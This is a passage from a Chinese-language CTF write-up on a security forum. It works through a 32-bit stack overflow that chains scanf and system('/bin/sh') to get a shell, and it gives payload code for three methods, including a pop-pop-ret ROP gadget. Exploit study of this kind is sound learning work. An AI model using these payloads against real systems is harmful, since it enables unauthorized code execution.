scanf第二个输入进的参数&v1     ---p32(binsh_addr)  --esp+2
执行时是取esp+2,esp+3

```

scanf 在执行过程中，由于我们没有将 scanf 的返回地址压入栈中，所以第一个读取的是 esp+2，将我们需要输入的 binsh 的地址当作了格式化参数 %s 来读取，发生错误。之后 scanf 也没办法正常返回

8. 所以我们用 main 函数的 return 来调用 scanf 时，需要给栈布置一个 scanf 的返回地址，否则 scanf 执行过程中会读取参数发生错误，不能正常读取和返回。

9. 那么第一次的 shellcode 顺序应该是‘A’*0x34 + scanf_addr + scanf_returnaddr + format_s + binsh_addr。

```
#注释头
 
shellcode1 = 'A'*0x34 #padding
shellcode1 += scanf_addr # 调用scanf以从STDIN读取"/bin/sh"字符串
shellcode1 += scanf_retn_addr # scanf返回地址
shellcode1 += format_s # scanf参数 
shellcode1 += binsh_addr # "/bin/sh"字符串所在地址

```

之后大多有两种解决方案：

▲第一种：将 scanf 返回到 main，再次执行栈溢出：

也就是将 scanf 的返回地址设置为 main 函数的地址，scanf 出来之后，回到 mian 中之后，第二次的 shellcode 应该是’A’*0x2c +system_addr + system_ret_addr + binsh_addr。这里的 system_addr 和上述的 scanf 中是一样的，都是为了防止函数读取参数发生错误从而无法正常执行。但是这里的 system_ret_addr 可以随便填，因为我们并不需要返回 system，进入到 system 之后执行 binsh 就能 getshell 了。而’A’*2c 是因为栈的状态发生了改变，所以需要重新计算一下。因为再次进入 main 函数构造出来的 Main 函数栈应该是 0x40，而不是之前 0x48 这么大了，没有经过 start 函数初始化 main 函数栈，不存在压入的全局偏移，系统只是将这次的 main 函数当作一个普通的函数来构造栈。

所以这一次我们输入的内容距离栈底就确实只有 0x28 这么远了，那么计算一下 0x28+0x04=0x2c，所以这一次的 padding 就是 0x2c。

```
#注释头
 
shellcode2 = 'B'*0x2c #padding
shellcode2 += system_addr #跳转到system函数以执行system("/bin/sh")
shellcode2 += main_addr # system函数返回地址，随便填
shellcode2 += binsh_addr #system函数的参数

```

▲第二种：将 scanf 的返回地址拿来做文章，通过 rop 将 esp 直接下拉两个 0x04 到达我们输入的 system，然后在从之后的地方读取 binsh 字符串，一次 payload 直接搞定：

![](https://bbs.pediy.com/upload/attach/202108/904686_UFGWCUR3U3W59Z6.jpg)

通过汇编代码可以看到，调用 scanf 时的栈状态应该跟下图一样：

![](https://bbs.pediy.com/upload/attach/202108/904686_WHCA5NNDY5JWBEU.jpg)

所以我们 scanf 函数返回时 esp 应该还是指向的 format 参数地址才对，那么为了将 esp 下拉两个 0x04，到达输入的 system 函数地址，就需要两个 Pop 操作，这里通过 ROPgadget 可以查出来，或者直接从 init 什么的初始化段中找万能 gadget，同样存在多个 Pop 操作。那么这样的化就只有一次 payload，所以总的 payload 就应该是：

```
#注释头
 
shellcode1 = 'A'*0x34 #padding
shellcode1 += scanf_addr # 调用scanf以从STDIN读取"/bin/sh"字符串
shellcode1 += pop_pop_ret_addr# scanf返回后到两个Pop操作处
shellcode1 += format_s # scanf参数
shellcode1 += binsh_addr #作为scanf的参数读取binsh字符串
shellcode1 += system_addr # "/bin/sh"字符串所在地址
shellcode1 += binsh_addr #作为system的参数getshell

```

▲这里再给出第三种方案，也比较容易理解

这个方案是基于第一种的，覆盖 scanf 返回地址为 start 函数，这样 main 函数栈又重新初始化，相当重新执行一次程序，那么第二次的 shellcode 的 padding 字符个数还是 0x34 个 A，之后就常规覆盖 eip 跳转 system 函数 getshell 了。但是这里直接写 start 函数的首地址会出错，因为这里的 start 首地址为 0x08048420，末尾为 20，转化成字符串就是空格。而读入我们输入的又是 scanf，scanf 不支持空格录入，所以遇到空格就会发生截断，导致读不进去。而这里又是因为大端序，如果发生 0x08048420，那么先发送的字符是 0x20，也就是空格，那么就直接截断，之后所有数据都读不了了。所以这里如果需要传入 start 函数，则将 start 函数下拉两个字节，传入 0x08048422。看汇编代码：

![](https://bbs.pediy.com/upload/attach/202108/904686_K2FJ987TQYJGTXT.jpg)

start 函数体的第一条汇编指令是 xor ebp,ebp。异或操作，就是将 ebp 清理好初始化而已，啥用也没有，所以可以直接跳过，到 pop esi 就行。具体代码就是将第一种方案的种第一段 shellcode 的 main_addr 改成 start_addr+0x02，然后偏移都是 0x34 就行。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

[https://www.cnblogs.com/sweetbaby/p/14148625.html](https://www.cnblogs.com/sweetbaby/p/14148625.html)

[[培训] 优秀毕业生寄语：恭喜 id: 一颗金柚子获得阿里 offer《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-15958.htm)

最后于 10 分钟前 被 PIG-007 编辑 ，原因：

[#缓冲区溢出](forum-150-1-156.htm) [#Linux](forum-150-1-161.htm) [#漏洞利用](forum-150-1-154.htm)